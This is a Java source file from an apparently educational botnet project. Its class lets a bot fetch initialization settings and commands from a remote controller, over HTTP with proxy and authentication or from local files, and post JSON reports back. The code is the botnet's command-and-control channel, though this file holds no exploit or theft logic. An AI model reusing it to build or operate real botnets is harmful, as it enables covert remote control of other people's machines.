/*
  The MIT License (MIT)

  Copyright (c) 2017 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core;

import com.acmutv.botnet.config.AppConfiguration;
import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.core.control.Controller;
import com.acmutv.botnet.core.control.ControllerProperties;
import com.acmutv.botnet.core.control.ControllerService;
import com.acmutv.botnet.core.control.command.BotCommand;
import com.acmutv.botnet.core.control.command.BotCommandService;
import com.acmutv.botnet.core.control.serial.ControllerPropertiesFormat;
import com.acmutv.botnet.core.report.Report;
import com.acmutv.botnet.log.AppLogMarkers;
import com.acmutv.botnet.tool.io.IOManager;
import com.acmutv.botnet.tool.net.HttpManager;
import com.fasterxml.jackson.core.JsonProcessingException;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;

/**
 * A collection of common bot-controller interactions
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class BotControllerInteractions {

  /**
   * Returns the controller properties for {@code controller}.
   * @param controller the controller to contact.
   * @return the controller properties.
   * @throws IOException when properties cannot be read.
   */
  public static ControllerProperties getInitialization(Controller controller) throws IOException {
    ControllerProperties props;
    String initResource = controller.getInitResource();
    if (HttpManager.isHttpUrl(initResource)) {
      CloseableHttpClient client = HttpClients.createDefault();
      HttpHost proxy = controller.getProxy(AppConfigurationService.getConfigurations().getProxy())
          .toHttpHost();
      HttpGet httpGet = new HttpGet(initResource);
      controller.getAuthentication(AppConfigurationService.getConfigurations().getAuthentication())
          .forEach(httpGet::setHeader);
      if (proxy != null) httpGet.setConfig(RequestConfig.custom().setProxy(proxy).build());
      try (CloseableHttpResponse response = client.execute(httpGet)) {
        HttpEntity entity = response.getEntity();
        try (InputStream in = entity.getContent()) {
          props = ControllerService.from(ControllerPropertiesFormat.JSON, in);
        }
        EntityUtils.consume(entity);
      } finally {
        client.close();
      }
    } else {
      try (InputStream in = IOManager.getInputStream(initResource)) {
        props = ControllerService.from(ControllerPropertiesFormat.JSON, in);
      }
    }
    return props;
  }

  /**
   * @param controller the controller to contact.
   * @param client the HTTP client to contact with.
   * @return the command to execute.
   * @throws IOException when command cannot be read.
   */
  public static BotCommand getCommand(Controller controller, CloseableHttpClient client) throws IOException {
    BotCommand cmd;
    String cmdResource = controller.getCmdResource();
    if (HttpManager.isHttpUrl(cmdResource)) {
      HttpHost proxy = controller.getProxy(AppConfigurationService.getConfigurations().getProxy())
          .toHttpHost();
      HttpGet httpGet = new HttpGet(cmdResource);
      controller.getAuthentication(AppConfigurationService.getConfigurations().getAuthentication())
          .forEach(httpGet::setHeader);
      if (proxy != null) httpGet.setConfig(RequestConfig.custom().setProxy(proxy).build());
      try (CloseableHttpResponse response = client.execute(httpGet)) {
        HttpEntity entity = response.getEntity();
        try (InputStream in = entity.getContent()) {
          cmd = BotCommandService.fromJson(in);
        }
        EntityUtils.consume(entity);
      }
    } else {
      try (InputStream in = IOManager.getInputStream(cmdResource)) {
        cmd = BotCommandService.fromJson(in);
        IOManager.writeResource(cmdResource, BotCommand.NONE.toJson());
      }
    }
    return cmd;
  }

  /**
   * @param controller the controller to contact.
   * @return the command to execute.
   * @throws IOException when command cannot be read.
   */
  public static BotCommand getCommand(Controller controller) throws IOException {
    BotCommand cmd;
    String cmdResource = controller.getCmdResource();
    try (InputStream in = IOManager.getInputStream(cmdResource)) {
      cmd = BotCommandService.fromJson(in);
      IOManager.writeResource(cmdResource, BotCommand.NONE.toJson());
    }
    return cmd;
  }

  /**
   * Sends the {@code report} to the {@code controller}.
   * @param controller the controller to contact.
   * @param client the HTTP client to contact with.
   * @param report the report to send.
   * @throws IOException when report cannot be sent.
   */
  public static void submitReport(Controller controller, Report report, CloseableHttpClient client)
      throws IOException {
    if (HttpManager.isHttpUrl(controller.getLogResource())) {
      postReport(controller, report, client);
    } else {
      submitReport(controller, report);
    }
  }

  /**
   * Sends the {@code report} to the {@code controller}.
   * @param controller the controller to contact.
   * @param client the HTTP client to contact with.
   * @param report the report to send.
   * @throws IOException when report cannot be sent.
   */
  public static void postReport(Controller controller, Report report, CloseableHttpClient client) throws IOException {
    String reportResource = controller.getLogResource();
    String json = report.toJson();
    HttpHost proxy = controller.getProxy(AppConfigurationService.getConfigurations().getProxy()).toHttpHost();
    HttpPost httpPost = new HttpPost(reportResource);
    StringEntity data = new StringEntity(json);
    data.setContentType("application/json");
    httpPost.setEntity(data);
    controller.getAuthentication(AppConfigurationService.getConfigurations().getAuthentication())
        .forEach(httpPost::setHeader);
    if (proxy != null) httpPost.setConfig(RequestConfig.custom().setProxy(proxy).build());
    try (CloseableHttpResponse response = client.execute(httpPost)) {
      HttpEntity entity = response.getEntity();
      EntityUtils.consume(entity);
    }
  }

  /**
   * Sends the {@code report} to the {@code controller}.
   * @param controller the controller to contact.
   * @param report the report to send.
   * @throws IOException when report cannot be sent.
   */
  public static void submitReport(Controller controller, Report report)
      throws IOException {
    String reportResource = controller.getLogResource();
    String json = report.toJson();
    IOManager.writeResource(reportResource, json);
  }
}
